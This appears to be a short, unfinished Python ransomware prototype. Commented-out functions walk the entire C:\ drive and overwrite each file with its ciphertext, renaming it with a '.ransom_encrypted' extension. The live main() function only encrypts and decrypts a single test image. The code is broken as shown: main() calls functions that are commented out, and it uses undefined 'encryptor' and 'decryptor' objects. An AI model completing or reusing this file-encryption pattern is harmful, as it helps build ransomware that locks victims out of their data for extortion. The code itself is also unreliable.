import os
import asyncio
import http_requests

import aes_cipher
import rsa_cipher

# def encrypt_all_files(PUBLIC_KEY):
#     # iterate over files in
#     # that directory
#     for root, dirs, files in os.walk('C:\\'):
#         for filename in files:
#             print(os.path.join(root, filename))

# async def encrypt_file(encryptor, filepath):
#     with open(filepath, 'rb') as file:
#         data = file.read()

#     ciphertext = encryptor.encrypt(data)

#     with open(filepath, 'w') as file:
#         file.write(ciphertext)

#     os.rename(filepath, f'{filepath}.ransom_encrypted')

#     file.close()
#     print('yey')

# async def decrypt_file(decryptor, filepath):
#     with open(filepath, 'rb') as file:
#         data = file.read()

#     decrypted = decryptor.decrypt(data)
#     with open(filepath, 'w') as file:
#         file.write(decrypted)

#     file.close()
#     print('yey')


async def main():
    rsa_cipher.setup()

    await encrypt_file(encryptor, 'image.jpg')
    await decrypt_file(decryptor, 'image.jpg.ransom_encrypted')


    print('yey')

asyncio.run(main())